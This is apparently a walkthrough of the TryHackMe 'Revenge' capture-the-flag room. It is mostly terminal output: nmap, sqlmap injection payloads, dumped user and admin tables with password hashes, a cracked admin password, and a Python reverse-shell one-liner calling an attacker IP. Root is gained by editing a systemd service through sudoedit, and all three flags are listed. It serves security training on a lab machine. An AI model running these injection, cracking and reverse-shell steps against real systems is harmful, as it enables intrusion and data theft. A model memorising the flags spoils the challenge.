# Revenge

You've been hired by Billy Joel to get revenge on Ducky Inc...the company that fired him. Can you break into the server and complete your mission?

[Revenge](https://tryhackme.com/room/revenge)

## Topic's

- Network Enumeration
- SQL Enumeration
- Brute Forcing (Hash)
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Message from Billy Joel

Billy Joel has sent you a message regarding your mission. Download it, read it and continue on.

1. Read through your mission and continue

```
kali@kali:~/CTFs/tryhackme/Revenge$ cat qTyAhRp.txt
To whom it may concern,

I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy
and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.
I've done some initial enumeration of the site because I know *some* things about hacking but not enough.
For that reason, I'll let you do your own enumeration and checking.

What I want you to do is simple.  Break into the server that's running the website and deface the front page.
I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.

When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.
Half up-front and half when you finish.

Good luck,

Billy
```

`No answer needed`

## Task 2 Revenge!

This is revenge! You've been hired by Billy Joel to break into and deface the **Rubber Ducky Inc**. webpage. He was fired for probably good reasons but who cares, you're just here for the money. Can you fulfill your end of the bargain?

_There is a sister room to this one. If you have not completed [Blog](https://tryhackme.com/room/blog) yet, I recommend you do so. It's not required but may enhance the story for you._

_All images on the webapp, including the navbar brand logo, 404 and 500 pages, and product images goes to [Varg](https://tryhackme.com/p/Varg). Thanks for helping me out with this one, bud._

**Please hack responsibly. Do not attack a website or domain that you do not own the rights to. TryHackMe does not condone illegal hacking. This room is just for fun and to tell a story.**

```
kali@kali:~/CTFs/tryhackme/Revenge$ sudo nmap -A -sS -sC -sV -O 10.10.232.228
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 21:57 CEST
Nmap scan report for 10.10.232.228
Host is up (0.044s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)
|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)
|_  256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Home | Rubber Ducky Inc.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/18%OT=22%CT=1%CU=39393%PV=Y%DS=2%DC=T%G=Y%TM=5F8C9E
OS:47%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   36.21 ms 10.8.0.1
2   46.97 ms 10.10.232.228

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.40 seconds
```

[http://10.10.232.228/products/99](http://10.10.232.228/products/99)

```
kali@kali:~/CTFs/tryhackme/Revenge$ sqlmap --current-db -u http://10.10.232.228/products/1
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.9#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:00:42 /2020-10-18/

[22:00:42] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q]
[22:00:47] [INFO] testing connection to the target URL
[22:00:48] [INFO] checking if the target is protected by some kind of WAF/IPS
[22:00:48] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
are you sure that you want to continue with further target testing? [Y/n]
[22:00:50] [WARNING] please consider usage of tamper scripts (option '--tamper')
[22:00:50] [INFO] testing if the target URL content is stable
[22:00:50] [INFO] target URL content is stable
[22:00:50] [INFO] testing if URI parameter '#1*' is dynamic
[22:00:50] [WARNING] URI parameter '#1*' does not appear to be dynamic
[22:00:51] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[22:00:51] [INFO] testing for SQL injection on URI parameter '#1*'
[22:00:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:00:53] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[22:00:55] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
[22:01:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[22:01:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[22:01:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[22:01:23] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[22:01:23] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[22:01:23] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[22:01:23] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[22:01:23] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[22:01:23] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:01:23] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:01:23] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:01:23] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:01:23] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[22:01:24] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[22:01:24] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:01:24] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[22:01:24] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[22:01:24] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[22:01:24] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[22:01:24] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[22:01:24] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[22:01:24] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[22:01:25] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[22:01:25] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[22:01:25] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[22:01:25] [INFO] testing 'Generic inline queries'
[22:01:25] [INFO] testing 'MySQL inline queries'
[22:01:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:01:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[22:01:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[22:01:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[22:01:26] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[22:01:26] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[22:01:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:01:36] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[22:01:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:01:36] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:01:36] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:01:36] [INFO] target URL appears to have 8 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N]
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]
[22:01:46] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 119 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://10.10.232.228:80/products/1 AND 8138=8138

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://10.10.232.228:80/products/1 AND (SELECT 2437 FROM (SELECT(SLEEP(5)))afyQ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: http://10.10.232.228:80/products/-2625 UNION ALL SELECT 88,CONCAT(0x71787a6b71,0x5a766c585777594e444d596c55786e71626a68676c7255716b696d6b70575348705741616779504d,0x71766a7171),88,88,88,88,88,88-- -
---
[22:01:48] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[22:01:49] [INFO] fetching current database
current database: 'duckyinc'
[22:01:49] [WARNING] HTTP error codes detected during run:
405 (Method Not Allowed) - 1 times, 500 (Internal Server Error) - 80 times
[22:01:49] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.232.228'

[*] ending @ 22:01:49 /2020-10-18/

kali@kali:~/CTFs/tryhackme/Revenge$ sqlmap -D duckyinc --dump -u http://10.10.232.228/products/1
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.9#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:01:58 /2020-10-18/

[22:01:58] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q]
[22:01:59] [INFO] resuming back-end DBMS 'mysql'
[22:01:59] [INFO] testing connection to the target URL
[22:02:00] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://10.10.232.228:80/products/1 AND 8138=8138

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://10.10.232.228:80/products/1 AND (SELECT 2437 FROM (SELECT(SLEEP(5)))afyQ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: http://10.10.232.228:80/products/-2625 UNION ALL SELECT 88,CONCAT(0x71787a6b71,0x5a766c585777594e444d596c55786e71626a68676c7255716b696d6b70575348705741616779504d,0x71766a7171),88,88,88,88,88,88-- -
---
[22:02:00] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[22:02:00] [INFO] fetching tables for database: 'duckyinc'
[22:02:01] [INFO] retrieved: 'product'
[22:02:01] [INFO] retrieved: 'system_user'
[22:02:01] [INFO] retrieved: 'user'
[22:02:01] [INFO] fetching columns for table 'user' in database 'duckyinc'
[22:02:02] [INFO] retrieved: 'id','int(11)'
[22:02:03] [INFO] retrieved: 'username','varchar(64)'
[22:02:03] [INFO] retrieved: '_password','varchar(128)'
[22:02:03] [INFO] retrieved: 'credit_card','varchar(26)'
[22:02:03] [INFO] retrieved: 'email','varchar(120)'
[22:02:03] [INFO] retrieved: 'company','varchar(50)'
[22:02:03] [INFO] fetching entries for table 'user' in database 'duckyinc'
[22:02:04] [INFO] retrieved: '$2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa','Fake Inc','4338736490565706','sales@fakeinc.org','1','jhenry'
[22:02:04] [INFO] retrieved: '$2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm','Evil Corp','355219744086163','accountspayable@ecorp.org','2','smonroe'
[22:02:04] [INFO] retrieved: '$2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C','McDoonalds Inc','349789518019219','accounts.payable@mcdoonalds.org','3','dross'
[22:02:04] [INFO] retrieved: '$2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO','ABC Corp','4499108649937274','sales@ABC.com','4','ngross'
[22:02:04] [INFO] retrieved: '$2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu','Three Below','4563593127115348','sales@threebelow.com','5','jlawlor'
[22:02:04] [INFO] retrieved: '$2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC','Krasco Org','thm{br3ak1ng_4nd_3nt3r1ng}','ap@krasco.org','6','mandrews'
[22:02:04] [INFO] retrieved: '$2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm','Wally World Corp','4905698211632780','payable@wallyworld.com','7','dgorman'
[22:02:04] [INFO] retrieved: '$2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS','Orlando City','4690248976187759','payables@orlando.gov','8','mbutts'
[22:02:05] [INFO] retrieved: '$2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem','Dolla Twee','375019041714434','sales@dollatwee.com','9','hmontana'
[22:02:05] [INFO] retrieved: '$2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36','O!  Fam Dollar','364774395134471','sales@ofamdollar','10','csmith'
Database: duckyinc
Table: user
[10 entries]
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| id | email                           | company          | username | _password                                                    | credit_card                |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{br3ak1ng_4nd_3nt3r1ng} |
| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+

[22:02:05] [INFO] table 'duckyinc.`user`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.232.228/dump/duckyinc/user.csv'
[22:02:05] [INFO] fetching columns for table 'product' in database 'duckyinc'
[22:02:05] [INFO] retrieved: 'id','int(11)'
[22:02:05] [INFO] retrieved: 'name','varchar(64)'
[22:02:05] [INFO] retrieved: 'price','decimal(10,2)'
[22:02:05] [INFO] retrieved: 'cost','decimal(10,2)'
[22:02:05] [INFO] retrieved: 'image_url','varchar(64)'
[22:02:06] [INFO] retrieved: 'color_options','varchar(64)'
[22:02:06] [INFO] retrieved: 'in_stock','varchar(1)'
[22:02:06] [INFO] retrieved: 'details','varchar(360)'
[22:02:06] [INFO] fetching entries for table 'product' in database 'duckyinc'
[22:02:06] [INFO] retrieved: 'yellow','50.00','Individual boxes of duckies! Boxes are sold only in the yellow color. This item is eligible for FAST shipping from one of our local warehouses....
[22:02:06] [INFO] retrieved: 'yellow, blue, green, red','500.00','Do you love a dozen donuts? Then you'll love a dozen boxes of duckies! This item is not eligible for FAST shipping. However,...
[22:02:06] [INFO] retrieved: 'yellow, blue, red, orange','800.00','Got lots of shelves to fill? Customers that want their duckies? Look no further than the pallet of duckies! This baby comes...
[22:02:06] [INFO] retrieved: 'yellow, blue','15000.00','This is it! Our largest order of duckies! You mean business with this order. You must have a ducky emporium if you need this many duck...
Database: duckyinc
Table: product
[4 entries]
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
| id | cost     | name                  | price    | details                                                                                                                                                                                                                                                                                                                 | in_stock | image_url                         | color_options             |
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
| 1  | 50.00    | Box of Duckies        | 35.00    | Individual boxes of duckies! Boxes are sold only in the yellow color. This item is eligible for FAST shipping from one of our local warehouses. If you order before 2 PM on any weekday, we can guarantee that your order will be shipped out the same day.                                                             | Y        | images/box-of-duckies.png         | yellow                    |
| 2  | 500.00   | Dozen of Duckies      | 600.00   | Do you love a dozen donuts? Then you'll love a dozen boxes of duckies! This item is not eligible for FAST shipping. However, orders of this product are typically shipped out next day, provided they are ordered prior to 2 PM on any weekday.                                                                         | N        | images/dozen-boxes-of-duckies.png | yellow, blue, green, red  |
| 3  | 800.00   | Pallet of Duckies     | 1000.00  | Got lots of shelves to fill? Customers that want their duckies? Look no further than the pallet of duckies! This baby comes with 20 boxes of duckies in the colors of your choosing. Boxes can only contain one color ducky but multiple colors can be selected when you call to order. Just let your salesperson know. | N        | images/pallet.png                 | yellow, blue, red, orange |
| 4  | 15000.00 | Truck Load of Duckies | 22000.00 | This is it! Our largest order of duckies! You mean business with this order. You must have a ducky emporium if you need this many duckies. Due to the logistics with this type of order, FAST shipping is not available.\r\n\r\nActual truck not pictured.                                                              | Y        | images/truckload.png              | yellow, blue              |
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+

[22:02:06] [INFO] table 'duckyinc.product' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.232.228/dump/duckyinc/product.csv'
[22:02:06] [INFO] fetching columns for table 'system_user' in database 'duckyinc'
[22:02:07] [INFO] retrieved: 'id','int(11)'
[22:02:07] [INFO] retrieved: 'username','varchar(64)'
[22:02:07] [INFO] retrieved: '_password','varchar(128)'
[22:02:07] [INFO] retrieved: 'email','varchar(120)'
[22:02:07] [INFO] fetching entries for table 'system_user' in database 'duckyinc'
[22:02:07] [INFO] retrieved: '$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a','sadmin@duckyinc.org','1','server-admin'
[22:02:07] [INFO] retrieved: '$2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa','kmotley@duckyinc.org','2','kmotley'
[22:02:07] [INFO] retrieved: '$2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK','dhughes@duckyinc.org','3','dhughes'
Database: duckyinc
Table: system_user
[3 entries]
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+

[22:02:07] [INFO] table 'duckyinc.`system_user`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.232.228/dump/duckyinc/system_user.csv'
[22:02:07] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.232.228'

[*] ending @ 22:02:07 /2020-10-18/
```

```
kali@kali:~/CTFs/tryhackme/Revenge$ john server-admin.hash /usr/share/wordlists/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 256 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
inuyasha         (?)
1g 0:00:00:07 DONE 2/3 (2020-10-18 22:04) 0.1394g/s 296.2p/s 296.2c/s 296.2C/s eduardo..50cent
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```
kali@kali:~/CTFs/tryhackme/Revenge$ ssh server-admin@10.10.232.228
The authenticity of host '10.10.232.228 (10.10.232.228)' can't be established.
ECDSA key fingerprint is SHA256:p6l0aKeIJlyHmiqZxt/pRvjb++LAjF9jTDp4ZkSCpOk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.232.228' (ECDSA) to the list of known hosts.
server-admin@10.10.232.228's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


8 packages can be updated.
0 updates are security updates.


################################################################################
#                        Ducky Inc. Web Server 00080012                        #
#            This server is for authorized Ducky Inc. employees only           #
#                  All actiions are being monitored and recorded               #
#                    IP and MAC addresses have been logged                     #
################################################################################
Last login: Wed Aug 12 20:09:36 2020 from 192.168.86.65
server-admin@duckyinc:~$ ls
flag2.txt
server-admin@duckyinc:~$ cat flag2.txt
thm{4lm0st_th3re}
```

```
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin:
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit
        /etc/systemd/system/duckyinc.service
```

```
/usr/bin/python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

```
server-admin@duckyinc:~$ sudoedit /etc/systemd/system/duckyinc.service
```

```
# ls /root
flag3.txt
# cat /root/flag3.txt
thm{m1ss10n_acc0mpl1sh3d}
```

1. flag1

`thm{br3ak1ng_4nd_3nt3r1ng}`

2. flag2

`thm{4lm0st_th3re}`

3. flag3

`thm{m1ss10n_acc0mpl1sh3d}`
